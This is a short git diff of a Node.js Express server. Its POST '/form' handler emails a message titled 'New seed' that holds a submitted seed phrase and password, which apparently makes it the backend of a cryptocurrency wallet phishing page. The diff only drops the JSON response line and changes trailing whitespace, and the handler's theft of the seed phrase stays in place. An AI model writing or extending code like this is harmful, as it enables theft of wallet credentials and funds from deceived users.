@@ -36,9 +36,8 @@ app.post('/form', async(req, res) => {
     subject: "New seed", 
     text: `seed: ${seed} password: ${password ? password : ''}`
   })
-  res.json(response)
 }) 
 
 app.listen(port, () => {
   console.log(`server started on port ${port}`)
-})
+})   
